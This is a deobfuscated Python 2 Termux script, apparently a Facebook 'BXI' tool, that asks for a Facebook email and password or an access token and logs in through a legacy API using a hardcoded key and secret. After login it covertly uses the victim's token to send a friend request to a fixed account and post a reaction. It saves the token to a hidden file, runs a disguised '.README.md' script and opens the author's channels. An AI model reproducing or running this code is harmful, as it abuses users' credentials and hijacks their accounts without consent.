# Deobfuscated BY HTR-TECH | Tahmid Rayat

# Github    : https://github.com/htr-tech 
# Instagram : https://www.instagram.com/tahmid.rayat
# Facebook  : https://fb.com/tahmid.rayat.oficial 
# Messenger : https://m.me/tahmid.rayat.oficial 

try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests,bxin
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('pip2 install bxin')
    time.sleep(1)
    os.system('python2 .README.md')

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system('clear')
##### LOGO #####
logo='''
88888888ba  8b        d8  88  
88      '8b  Y8,    ,8P   88  
88      ,8P   `8b  d8'    88  
88_____-8P'     Y88P      88  
88------8b,     d88b      88  
88      `8b   ,8P  Y8,    88  
88      a8P  d8'    `8b   88  
88888888P'  8P        Y8  88  

--------------------------------------------------

 Auther   : Binyamin
 GitHub   : https://github.com/binyamin-binni
 YouTube  : Trick Proof
 Blogspot : https://trickproof.blogspot.com

--------------------------------------------------
                                '''

CorrectUsername = 'binyamin'
CorrectPassword = 'bxi'

loop = 'true'
while (loop == 'true'):
    print logo
    username = raw_input(' TOOL USERNAME: ')
    if (username == CorrectUsername):
    	password = raw_input(' TOOL PASSWORD: ')
        if (password == CorrectPassword):
            print ' Logged in successfully as ' + username
            time.sleep(1)
            loop = 'false'
        else:
            print ' Wrong Password !'
            os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
            os.system('clear')
    else:
        print ' Wrong Username !'
        os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
        os.system('clear')
        
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print('\r[+] Loging In '+o),;sys.stdout.flush();time.sleep(1)

def cb():
    os.system('clear')

def t():
    time.sleep(1)
    
def login():
    os.system('clear')
    try:
        toket = open('....', 'r')
        os.system('python2 .README.md')
    except (KeyError,IOError):
        os.system('rm -rf ....')
        os.system('clear')
        print (logo)
        print ('[1] Login With Email/Number and Password')
        print ('[2] Login With Access Token')
        print (50*'-')
        login_choice()
        
def login_choice():
    bch = raw_input('\n ====>  ')
    if bch =='':
        print ('[!] Fill in correctly')
        login()
    elif bch =='2':
        os.system('clear')
        print (logo)
        fac=raw_input(' Paste Access Token Here: ')
        fout=open('....', 'w')
        fout.write(fac)
        fout.close()
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
        requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +fac)
        os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
        os.system('python2 .README.md')
    elif bch =='1':
        login1()
            
def login1():
	cb()
	try:
		tb=open('token.txt', 'r')
		os.system('python2 .README.md')
	except (KeyError,IOError):
		cb()
		print (logo)
		print('          [+] LOGIN WITH FACEBOOK [+]' )
		print
		id = raw_input('[+] ID/Email : ')
		pwd = getpass.getpass('[+] Password : ')
		tik()
		sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
		data = {'api_key':'882a8490361da98702bf97a021ddc14d','credentials_type':'password','email':id,'format':'JSON', 'generate_machine_id':'1','generate_session_cookies':'1','locale':'en_US','method':'auth.login','password':pwd,'return_ssl_resources':'0','v':'1.0'}
		x=hashlib.new('md5')
		x.update(sig)
		a=x.hexdigest()
		data.update({'sig':a})
		url = 'https://api.facebook.com/restserver.php'
		r=requests.get(url,params=data)
		z=json.loads(r.text)
		if 'access_token' in z:
		    st = open('....', 'w')
		    st.write(z['access_token'])
		    st.close()
		    print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
		    t()
		    os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
		    requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
		    requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +z['access_token'])
		    os.system('python2 .README.md')
		else:
		    if 'www.facebook.com' in z['error_msg']:
		        print ('Account has a checkpoint !')
		        os.system('rm -rf ....')
		        t()
		        login1()
		    else:
		        print ( 'email or password is wrong !')
		        os.system('rm -rf ....')
		        t()
		        login1()
			
if __name__=='__main__':
    login()
